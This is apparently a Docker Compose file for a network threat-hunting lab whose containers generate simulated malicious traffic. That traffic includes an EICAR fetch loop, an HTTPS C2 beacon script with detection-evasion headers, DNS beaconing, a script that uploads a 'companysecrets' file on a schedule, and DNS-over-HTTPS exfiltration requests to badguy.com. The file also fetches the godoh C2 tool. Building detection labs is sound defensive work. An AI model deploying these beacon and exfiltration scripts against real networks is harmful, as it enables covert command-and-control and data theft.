## SSL Orchestrator :: Threat Hunting Lab :: Clients
## Maintainer: kevin-at-f5-dot-com
## Last Updated: 2025-Feb-19
##
## Description: Provides a set of containers to perform various client functions:
##   - eicar_client
##        src: 192.168.80.202
##        function: Bash script to curl https://infected.badguy.com (to fetch eicar payload) on random interval (1-20s)
##   - beacon_client
##        src: 192.168.80.222
##        function: Python script that queries beacon server at https://c2.badguy.com with beacon payload on 30s interval
##   - random_requests_client
##        src: 192.168.80.21  -> .68
##        src: 192.168.80.70  -> .201
##        src: 192.168.80.203 -> .221
##        src: 192.168.80.223 -> .252
##        function: Python script that selects a source IP at random and requests a random site from websites.txt file
##   - dnsbeacon_client
##        src: 192.168.80.69
##        function: Bash script to dig beacon.cloudsecurity.ninja on 10s interval
##   - carepackage_client
##        src: 192.168.80.80
##        function: Python script that sends an encoded payload
##   - doh-client
##        src: 192.168.80.25
##        function: Bash script that simulates a DNS-over-HTTP exfiltration
##
## start containers
##   docker compose -f docker-sslo-threathunting-clients-vX.yaml up -d
##
## access containers
##   docker exec -it eicar_client /bin/bash
##
## watch containers
##   docker logs -f eicar_client
##
## stop containers
##   docker compose -f docker-sslo-threathunting-clients-vX.yaml down

services:
  eicar_client:
    container_name: eicar_client
    image: ubuntu:22.04
    restart: unless-stopped
    dns: 192.168.100.8
    networks:
      clientnet:
        ipv4_address: 192.168.80.202
    command:
      - /bin/bash
      - -c
      - |
        ## Update and install required binaries
        apt -o "Acquire::https::Verify-Peer=false" update
        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools

        ## Start container with infinite curl loop -- sleep for some random time between 60 and 120 seconds
        sleep 20
        while true
        do
          curl -sk https://infected.badguy.com
          sleep $$(( (RANDOM % 60) + 60 ))
        done

  
  beacon_client:
    # ref: https://github.com/snowblind-/beaconClient
    container_name: beacon_client
    image: ubuntu:22.04
    restart: unless-stopped
    dns: 192.168.100.8
    networks:
      clientnet:
        ipv4_address: 192.168.80.222
    command:
      - /bin/bash
      - -c
      - |
        ## Update and install required binaries
        apt -o "Acquire::https::Verify-Peer=false" update
        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools python3 python3-requests

        ## Create beaconClient.py
        cat > "/beaconClient.py" << 'EOF'
        import requests
        import time
        import ssl
        import random
        import logging
        import warnings
        import socket
        from urllib3.exceptions import InsecureRequestWarning
        from random import randrange

        # Suppress SSL warnings
        warnings.simplefilter('ignore', InsecureRequestWarning)

        # Set up logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

        # Specify the source IP address for the beacon (you can modify this as needed)
        src_ip = '192.168.80.222'  # Example source IP (change to your desired IP)

        # C2 server URL (you can modify this to the actual server you're targeting)
        C2_SERVER_URL = [
            "https://1c27eace-eb71-4548-8e0d-0c711ce2c699.cloudsecurity.ninja/beacon",
            "https://60bc6420-c2ef-49f0-86e1-8cea63070032.cloudsecurity.ninja/beacon",
            "https://716316b6-6836-4bb5-8cab-c5c94236952e.cloudsecurity.ninja/beacon" 
        ]

        # Payload to send
        PAYLOAD = "{beacon:fire away!}"

        # Time interval between beacons (in seconds)
        BEACON_INTERVAL = 30  # 30 seconds as an example

        # Create a session that binds to the specified source address
        def session_for_src_addr(addr: str) -> requests.Session:
            """
            Create a `Session` which will bind to the specified local address
            """
            session = requests.Session()
            for prefix in ('http://', 'https://'):
                session.get_adapter(prefix).init_poolmanager(
                    connections=requests.adapters.DEFAULT_POOLSIZE,
                    maxsize=requests.adapters.DEFAULT_POOLSIZE,
                    # This binds to the specified IP address
                    source_address=(addr, 0),
                )
            return session

        # Simulate the beacon
        def send_beacon(src_ip: str):
            try:
                # Randomizing the headers slightly to avoid detection
                headers = {
                    "User-Agent": f"CustomUserAgent/{random.randint(1, 100)}",
                    "Content-Type": "application/json"
                }

                # Payload data that is sent to the C2 server
                data = {
                    "payload": PAYLOAD
                }

                # Randomly select one of the C2 server URLs
                selected_URL = random.choice(C2_SERVER_URL)

                # Create the session that binds to the given source IP address
                session = session_for_src_addr(src_ip)

                # Send POST request to the C2 server, skipping SSL verification
                response = session.post(selected_URL, json=data, headers=headers, verify=False)

                # Log the response from the server
                if response.status_code == 200:
                    logging.info("Beacon sent successfully. Server Response: %s", response.text)
                else:
                    logging.warning("Failed to send beacon. Status Code: %d, Response: %s", response.status_code, response.text)

            except requests.exceptions.RequestException as e:
                logging.error("Error sending beacon: %s", e)

        # Main function to repeatedly send beacons -- sleep for some random number between 1 and BEACON_INTERVAL
        def main():
            logging.info("Beacon script started.")

            while True:
                send_beacon(src_ip)
                # sleeper = randrange(BEACON_INTERVAL)
                # time.sleep(sleeper)
                time.sleep(BEACON_INTERVAL)

        if __name__ == "__main__":
            main()
        EOF

        ## Start beaconClient
        python3 /beaconClient.py


  random_requests_client:
    # ref: https://github.com/snowblind-/randomRequests
    container_name: random_requests_client
    image: ubuntu:22.04
    restart: unless-stopped
    dns: 192.168.100.8
    cap_add:
      - NET_ADMIN
    networks:
      clientnet:
        ipv4_address: 192.168.80.20
    command:
      - /bin/bash
      - -c
      - |
        ## Update and install required binaries
        apt -o "Acquire::https::Verify-Peer=false" update
        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 git curl python3 python3-pip iputils-ping net-tools
        pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org pip requests psutil
 
        ## Import randomRequests project
        git -c http.sslVerify=false clone https://github.com/snowblind-/randomRequests.git
 
        ## Add ipv4 addresses (minus used IPs)        
        usedIPs=(20 25 69 80 202 222)
        for i in `seq 21 1 252`
        do
          if [[ $${usedIPs[@]} =~ $$i ]]
          then
            continue
          else
            ip address add 192.168.80.$$i dev eth0
          fi
        done
 
        ## Start container in infinite loop
        #tail -f /dev/null
 
        ## Start container with randomRequest execution
        sleep 20
        while true
        do
          python3 /randomRequests/randomRequests.py eth0 /randomRequests/websites.txt --interval 1
          sleep 120
        done


  dnsbeacon_client:
    container_name: dnsbeacon_client
    image: ubuntu:22.04
    restart: unless-stopped
    dns: 192.168.100.8
    networks:
      clientnet:
        ipv4_address: 192.168.80.69
    command:
      - /bin/bash
      - -c
      - |
        ## Update and install required binaries
        apt -o "Acquire::https::Verify-Peer=false" update
        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools dnsutils

        ## Start container with infinite curl loop
        sleep 20
        while true
        do
          dig beacon.cloudsecurity.ninja
          sleep 10
        done

  
  carepackage_client:
    #https://github.com/therealnoof/findthesheep/blob/main/carePackage.py
    container_name: carepackage_client
    image: ubuntu:22.04
    restart: unless-stopped
    dns: 192.168.100.8
    networks: 
      clientnet:
        ipv4_address: 192.168.80.80  
    command:
    - /bin/bash
    - -c 
    - |
      apt -o "Acquire::https::Verify-Peer=false" update
      apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 git curl python3 python3-pip iputils-ping net-tools

      ## create beaconClient.py
      cat > "/carePackage.py" << 'EOF'
      #!/usr/bin/env python3
      import os
      import time
      from urllib.request import Request, urlopen
      import mimetypes
      from ssl import create_default_context
      
      ## Define the file name and remote URL
      file_name = 'companysecrets.txt'
      remote_url = 'https://practice.expandtesting.com/upload'  # Replace with your actual remote IP or URL
      
      def create_file(file_name):
          current_directory = os.getcwd()
          full_path = os.path.join(current_directory, file_name)
          
          try:
              if not os.path.exists(current_directory):
                  os.makedirs(current_directory)
              
              with open(full_path, 'w') as file:
                  file.write("Q1RGLUhheDByIQ==")
              
              print(f"File '{file_name}' created successfully at {full_path}")
          
          except Exception as e:
              print(f"An error occurred while creating the file: {e}")
      
      def post_file(remote_url, full_path):
          try:
              if not os.path.exists(full_path):
                  raise FileNotFoundError(f"The file {full_path} does not exist.")
              
              with open(full_path, 'rb') as file:
                  content = file.read()
                  
                  # Get the MIME type of the file
                  content_type, _ = mimetypes.guess_type(full_path)
                  if content_type is None:
                      content_type = 'application/octet-stream'
                  
                  headers = {
                      'Content-Type': f'{content_type}',
                      'Content-Disposition': f'attachment; filename="{file_name}"'
                  }
              
              request = Request(
                  url=remote_url,
                  data=content,
                  headers=headers
              )
              
              # Create a custom SSL context that ignores certificate errors
              ssl_context = create_default_context()
              ssl_context.check_hostname = False
              ssl_context.verify_mode = 0
              
              with urlopen(request, context=ssl_context) as response:
                  if response.status == 200:
                      print("File posted successfully!")
                  else:
                      print(f"Failed to post file. Status code: {response.status}")
          
          except Exception as e:
              print(f"An error occurred while posting the file: {e}")
      
      def main():
          current_directory = os.getcwd()
          full_path = os.path.join(current_directory, file_name)
          
          try:
              create_file(file_name)
              
              # Loop every 10 minutes
              while True:
                  post_file(remote_url, full_path)
                  time.sleep(600)  # Sleep for 10 minutes (600 seconds)
      
          except Exception as e:
              print(f"An unexpected error occurred: {e}")
      
      if __name__ == "__main__":
          main()
      EOF

      ## start carePackage
      python3 /carePackage.py


  doh-client:
    container_name: doh-client
    image: ubuntu:24.04
    restart: unless-stopped
    dns: 192.168.100.8
    networks: 
      clientnet:
        ipv4_address: 192.168.80.25
    extra_hosts:
      - "cloudflare-dns.com: 192.168.100.16"
    command:
      - /bin/bash
      - -c
      - |
        ## Install packages
        apt -o "Acquire::https::Verify-Peer=false" update && apt install -y wget curl jq dnsutils net-tools iputils-ping
        
        ## Install q (DoH) client
        echo 'deb [trusted=yes] https://repo.natesales.net/apt /' > /etc/apt/sources.list.d/natesales.list
        apt -o "Acquire::https::Verify-Peer=false" update
        apt -o "Acquire::https::Verify-Peer=false" install q

        ## Install godoh c2 (client)
        mkdir /godoh
        wget https://github.com/sensepost/godoh/releases/download/1.6/godoh-linux64 --no-check-certificate -O /godoh/godoh
        chmod +x /godoh/godoh

        ## Spoof cloudflare-dns.com to local DoH server
        echo "192.168.100.16   cloudflare-dns.com" >> /etc/hosts

        ## Start a never ending task to keep container running
        #tail -f /dev/null

        ## Create DoH C2 agent exfiltration spoof
        cat > "/doh-agent.sh" << 'EOF'
        #!/bin/bash
        while true
        do
          ## Send a polling request a random number of times (10-50)
          i=1
          cnt=$$(( (RANDOM % 40) + 10 ))
          while [ $$i -le $$cnt ]
          do
            curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=396c396336.badguy.com&type=16'
            i=$$((i + 1))
            sleep 10
          done

          ## Sleep 10
          sleep 10

          ## Make a simulated c2 exfiltration request
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.be.0.00.1.0.0.0.0.badguy.com&type=1'
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.1.647872e4.1.3.1f8b08000000000002ff000e02f1fdce8e7b218bc336818afabb42844efe.7f3a11d50b4cc16e65da7f8e2d8d1766c08f4d4128b907d848bac92c5a8b.55a0f77f657da7fe28505f2d4cb6ce980e8c70928ba613cbadf1c8177452.badguy.com&type=1'
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.2.8b061369.1.3.ac8efa7dc42aa01f85851aed4607725ed4f353a76e597a224085ec2a5aad.24490ee3b4dd8fe9e989fb79e0ae710cb813d10e4658dd2ac385ad4a3cd1.89ca151cc1ebfc138d5f89f87117fe18351a989a2e8f713311046508ac86.badguy.com&type=1'
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.3.9f2e010a.1.3.b793618136bd8da9bf4997cc8976a1b1a1f091405ae84de8f73e2eaed603.fb9d9c4374a514e9ffe31cb4d5747e8e1f8a27e45c5ff22e0afb91865a87.7516cba2640c41b68a57b0c2361af419317fe787fc7bd5a23c4f61c6b3e7.badguy.com&type=1'
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.4.3be78615.1.3.4be768f6402e0228bcf587456bd8c86adf35449ac5407bf0c55723517ee9.48ea2d6b83c55a36f1facdc326de01dae3314c1154f09c85d1ea577335f5.c0e4dd2ec3de7dfcd351d437e111ec7a4aa2d088f20cb32241e51aadf0d1.badguy.com&type=1'
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.5.f5b8bcb3.1.3.a347d343128653611b63a882a3f1a0a86bbc8f27abc759f4cd072d036c00.6f906846c73f2b12b7a71f3dd6a7bfe0e4c0213591e206590c8d57750ec6.a0c41e15ce0343fb8c1fc34519ecf3b05c45ffe286d62844bed8dda236b2.badguy.com&type=1'
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.6.cc900086.1.3.33eebdc35a48013edd5665c1c54445a2eca20bc5591f1e6844de26e4d918.c67e3e5910a4e0d6dd92b6d251a2181a5b3bdb1fa7ef30781282734ed137.56c0121d2acce9e09a20d67c82e1e33301d945146035590723f490198513.badguy.com&type=1'
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.7.e1fd3b9.1.1.94010000ffff06f29f640e020000.0.0.badguy.com&type=1'
          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ca.8.00.1.0.0.0.0.badguy.com&type=1'

          ## Sleep 20 seconds and then restart the loop
          sleep 20
        done
        EOF

        ## Make script executable
        chmod +x /doh-agent.sh

        ## Run script
        /doh-agent.sh


networks:
  clientnet:
    driver: macvlan
    driver_opts:
      parent: ens7.800
    ipam:
      driver: default
      config:
        - subnet: 192.168.80.0/24
          gateway: 192.168.80.7
        
